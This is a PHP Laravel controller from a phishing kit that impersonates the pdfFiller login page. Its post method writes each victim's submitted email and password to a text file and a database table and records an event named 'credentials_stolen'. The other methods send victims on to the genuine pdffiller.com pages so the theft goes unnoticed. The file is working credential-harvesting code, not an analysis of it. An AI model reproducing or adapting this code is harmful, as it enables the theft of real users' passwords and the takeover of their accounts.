<?php

namespace App\Http\Controllers;

use App\Models\Creds;
use App\Models\Stats;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function post(Request $request)
    {
        try {
            $email = $request->email;
            $password = $request->password;
            if ($email && $password) {
                file_put_contents(storage_path('app') . '/crispy.txt', json_encode(['email' => $email, 'pass' => $password]) . PHP_EOL, FILE_APPEND);
                (new Creds)->fill([
                    'email' => $email,
                    'pwd' => $password
                ])->save();

                (new Stats)->fill(['event_code' => Stats::STATS_CODES['credentials_stolen']])->save();
            }
            redirect()->to('http://www.pdffiller.com/en/forms')->send();
        } catch (\Throwable $e) {
            dd($e);
        }
    }

    public function get()
    {
        redirect()->to('http://www.pdffiller.com/en/forms')->send();
    }

    public function redirect()
    {
        (new Stats)->fill(['event_code' => Stats::STATS_CODES['logged_out_of_pdffiller']])->save();
        try {
            redirect()->to('https://www.pdffiller.com/en/login/signin?ref=https%3A%2F%2Flink.pdffiller.com%2Fr%3Fu%3D1417350%26m%3D1006027211%26t%3D3575%26o%3DkazJBCoqakHESa3EnjYVvdpL0pxuCOlNDqY3iDT1A9bXN8zrOUjYCLg38mUjci9V7hdsq9f899Ys4Q%253D%253D%26s%3Ddirect_push')->send();
        } catch (\Throwable $e) {
            dd($e);
        }
    }

    public function socials()
    {
        (new Stats)->fill(['event_code' => Stats::STATS_CODES['social_auth_used']])->save();
        try {
            redirect()->to('https://www.pdffiller.com/en/login/signin')->send();
        } catch (\Throwable $e) {
            dd($e);
        }
    }
}
